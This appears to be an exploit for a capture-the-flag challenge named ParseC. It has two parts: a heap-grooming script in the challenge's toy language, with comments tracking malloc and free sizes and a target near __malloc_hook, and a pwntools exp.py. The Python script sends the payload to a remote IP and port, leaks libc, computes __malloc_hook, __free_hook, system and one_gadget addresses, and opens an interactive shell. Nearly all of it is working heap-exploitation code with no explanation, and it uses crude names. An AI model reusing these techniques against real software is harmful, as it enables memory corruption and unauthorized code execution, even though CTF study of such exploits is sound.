aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
pad1 = "aaaaaaaa";//malloc(0x10)
pad2 = "aaaaaaaa";//malloc(0x10)
db = "aaaaaaaa";//malloc(0x10)
overlap = db;
fuck2 = db;
fuck3 = db;
db = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
overlap = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";//malloc(0x30)
overlap_fuck_ptr = overlap;
overlap_fuck_ptr2 = overlap;
overlap_fuck_ptr3 = overlap;
newdb = db;
fuck3 = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";//malloc(0x30)
fucksize = " ";//malloc(0x10) local
fucksize1 = " ";//malloc(0x10) local
fucksize2 = "00000000q";//malloc(0x10) fuck size
overlap_fuck_ptr2 = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";//free
newdb = "aaaaaaaa";//malloc(0x10)
overlap2 = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
//malloc(0x380)
overlap3 = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";

//malloc(0x20)
fuckfdaboveaboveabove="a";
fuckfdaboveabove="a";//malloc(0x10)
fuckfdaboveaboveptr1=fuckfdaboveabove;
fuckfdaboveaboveptr2=fuckfdaboveabove;
fuckfdaboveaboveptr3=fuckfdaboveabove;
fuckfdaboveaboveptr4=fuckfdaboveabove;
fuckfdaboveaboveptr5=fuckfdaboveabove;
fuckfdaboveaboveptr6=fuckfdaboveabove;
fuckfdaboveaboveptr7=fuckfdaboveabove;

fuckfdabove="a";//malloc(0x10)
fuckfdaboveptr1=fuckfdabove;
fuckfdaboveptr2=fuckfdabove;
fuckfdaboveptr3=fuckfdabove;
fuckfdaboveptr4=fuckfdabove;
fuckfdaboveptr5=fuckfdabove;
fuckfdaboveptr6=fuckfdabove;
fuckfdaboveptr7=fuckfdabove;

fuckfd = " ";//mallochook-0x10
fuckfdptr1 = fuckfd;
fuckfdptr2 = fuckfd;
fuckfdptr3 = fuckfd;
fuckheap = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
fuckheapptr1 = fuckheap;
fuckheapptr2 = fuckheap;
fuckheapptr3 = fuckheap;
fuckheapptr4 = fuckheap;
fuckfdaboveaboveptr1 = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
fuckfdaboveaboveptr2 = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
fuckfdaboveaboveptr3 = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";

fuckfd201 = " ";
fuckfd202 = "AAAAAAAA";
fuckfd203 = "aaaaaaaaQ";

fuckfdaboveptr1 = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";

fuckfdaboveaboveptr4 = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
fuckfdaboveaboveptr5 = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
fuckfdaboveaboveptr6 = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";

fuckfd501 = "0";
fuckfd502 = "AAAAAAAA";
fuckfd503 = "X";

array xjbarr1(1);
fucknum=0.1;
read(fucknum);
xjbarr1[0]=fucknum;
print(xjbarr1[0]);

array xjbarr2(1);

array xjbarr3(1);
fucknum3=0.1;
read(fucknum3);
xjbarr3[0]=fucknum3;

getshell="/bin/sh";
getshell = "1";
read();
```



exp.py

```python
from pwn import *
from base64 import b64encode

REMOTE = 1

if REMOTE:
	with open('./exp','r') as f:
		data = f.read()
		b64data = b64encode(data)
	with open('./b64exp','w') as f:
		f.write(b64data)
	r = remote('123.57.4.93',34007)
	r.recvuntil('-------------------------------------------------------\n')
	r.sendline(b64data)

else:
	r = process(['./ParseC_ori','expl'],aslr=False)


libc = ELF('./libc-2.27.so')
leak = u64(r.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
libc_base = leak - libc.sym['__malloc_hook'] - 0x10-96
malloc_hook = libc_base+libc.sym['__malloc_hook']
free_hook = libc_base+libc.sym['__free_hook']
system = libc_base+libc.sym['system']
log.success(hex(libc_base))
one = libc_base+0x4f3c2
one2 = libc_base+0x4f365 
one3 = libc_base+0x10a45c
log.info(hex(one))#6.9533549949651e-310
log.info(hex(one2))#6.9533549949605e-310
log.info(hex(one3))#6.95335503281577e-310
log.info(hex(malloc_hook -0x28))
log.info('fuck you')
log.info(hex(free_hook -0x28))#6.9533551824222e-310
log.info(hex(system))#6.95335499497923e-310
r.interactive()
```

